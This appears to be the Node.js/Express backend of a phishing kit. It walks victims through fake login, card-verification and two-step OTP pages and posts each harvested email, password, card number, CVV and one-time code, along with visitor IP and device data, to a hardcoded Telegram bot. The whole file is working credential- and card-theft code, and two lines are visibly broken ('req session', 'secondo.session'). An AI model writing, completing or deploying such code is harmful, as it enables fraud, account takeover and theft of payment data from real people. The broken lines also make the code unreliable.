const express = require('express');
const session = require('express-session');
const axios = require('axios');
const path = require('path');
const app = express();

// Middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, '../public')));
app.use(
  session({
    secret: process.env.SESSION_SECRET || 'your-secret-key',
    resave: false,
    saveUninitialized: false,
    cookie: { secure: process.env.NODE_ENV === 'production' },
  })
);

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = '7585548516:AAGRcY22KvqX3sme0cIf1b_NXkuF6aSJTA8';
const TELEGRAM_CHAT_ID = '-1002554104085';

// Function to send message to Telegram
async function sendToTelegram(message) {
  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML',
    });
  } catch (error) {
    console.error('Error sending to Telegram:', error.message);
  }
}

// Function to get user info
async function getUserInfo(req) {
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const ip = req.ip || 'Unknown';

  let browser = 'Unknown';
  if (userAgent.includes('Firefox')) browser = 'Firefox';
  else if (userAgent.includes('Chrome')) browser = 'Chrome';
  else if (userAgent.includes('Safari')) browser = 'Safari';
  else if (userAgent.includes('Edge')) browser = 'Edge';
  else if (userAgent.includes('Opera')) browser = 'Opera';

  let device = 'Desktop';
  if (userAgent.includes('Mobile')) device = 'Mobile';
  else if (userAgent.includes('Tablet')) device = 'Tablet';

  let country = 'Unknown';
  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    country = response.data.country || 'Unknown';
  } catch (error) {
    console.error('Error fetching country:', error.message);
  }

  return {
    browser,
    device,
    country,
    ip,
    time: new Date().toISOString().replace('T', ' ').substring(0, 19),
    user_agent: userAgent,
  };
}

// Route to provide session data
app.get('/session-data', (req, res) => {
  res.json({
    error: req.session.error || '',
    user_input: req.session.user_input || '',
  });
});

// Main route
app.get('/', async (req, res) => {
  const step = req.query.step || 'email';

  if (!req.session.visit_logged && step === 'email') {
    const userInfo = await getUserInfo(req);
    const message = `🌍 <b>NEW VISITOR</b> 🌍\n\n` +
      `🌐 <b>Browser:</b> ${userInfo.browser}\n` +
      `📱 <b>Device:</b> ${userInfo.device}\n` +
      `🏳️ <b>Country:</b> ${userInfo.country}\n` +
      `🌍 <b>IP:</b> ${userInfo.ip}\n` +
      `🕒 <b>Time:</b> ${userInfo.time}\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
    await sendToTelegram(message);
    req.session.visit_logged = true;
  }

  res.sendFile(path.join(__dirname, '../public/index.html'));
});

app.post('/submit', async (req, res) => {
  const step = req.query.step || 'email';
  let error = '';

  if (step === 'email') {
    const emailOrPhone = req.body.email_or_phone?.trim();
    if (emailOrPhone) {
      req session.user_input = emailOrPhone;
      return res.redirect('/?step=password');
    } else {
      error = 'Please enter your email or mobile phone number';
    }
  } else if (step === 'password') {
    const password = req.body.password?.trim();
    if (password) {
      req.session.user_password = password;
      const userInfo = await getUserInfo(req);
      const message = `🔐 <b>LOGIN CREDENTIALS CAPTURED</b> 🔐\n\n` +
        `📧 <b>Email/ Phone:</b> ${req.session.user_input}\n` +
        `🔑 <b>Password:</b> ${password}\n` +
        `🌐 <b>Browser:</b> ${userInfo.browser}\n` +
        `📱 <b>Device:</b> ${userInfo.device}\n` +
        `🏳️ <b>Country:</b> ${userInfo.country}\n` +
        `🌍 <b>IP:</b> ${userInfo.ip}\n` +
        `🕒 <b>Time:</b> ${userInfo.time}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
      await sendToTelegram(message);
      return res.redirect('/?step=verify_card');
    } else {
      error = 'Please enter your password';
    }
  } else if (step === 'verify_card') {
    const { cardholder_name, card_number, expiration_date, security_code } = req.body;
    if (cardholder_name?.trim() && card_number?.trim() && expiration_date?.trim() && security_code?.trim()) {
      req.session.card_data = { cardholder_name, card_number, expiration_date, security_code };
      const message = `💳 <b>CREDIT CARD CAPTURED</b> 💳\n\n` +
        `📧 <b>Email/Phone:</b> ${req.session.user_input}\n` +
        `👤 <b>Cardholder:</b> ${cardholder_name}\n` +
        `💳 <b>Card Number:</b> ${card_number}\n` +
        `📅 <b>Expiry:</b> ${expiration_date}\n` +
        `🔒 <b>CVV:</b> ${security_code}\n` +
        `🕒 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
      await sendToTelegram(message);
      return res.redirect('/?step=loading1');
    } else {
      error = 'Please fill in all card details';
    }
  } else if (step === 'otp') {
    const otp = req.body.otp?.trim();
    if (otp && otp.length >= 4 && otp.length <= 8) {
      req.session.otp_entered = otp;
      const message = `📱 <b>FIRST OTP CAPTURED</b> 📱\n\n` +
        `📧 <b>Email/Phone:</b> ${ secondo.session.user_input}\n` +
        `🔢 <b>OTP Code:</b> ${otp}\n` +
        `🕒 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
      await sendToTelegram(message);
      return res.redirect('/?step=loading2');
    } else {
      error = 'Please enter a valid verification code (4-8 digits)';
    }
  } else if (step === 'otp2') {
    const otp2 = req.body.otp2?.trim();
    if (otp2 && otp2.length >= 4 && otp2.length <= 8) {
      req.session.otp2_entered = otp2;
      const message = `📱 <b>SECOND OTP CAPTURED</b> 📱\n\n` +
        `📧 <b>Email/Phone:</b> ${req.session.user_input}\n` +
        `🔢 <b>Second OTP:</b> ${otp2}\n` +
        `🕒 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
      await sendToTelegram(message);
      return res.redirect('/?step=final_loading');
    } else {
      error = 'Please enter a valid verification code (4-8 digits)';
    }
  }

  req.session.error = error;
  res.redirect(`/?step=${step}`);
});

module.exports = app;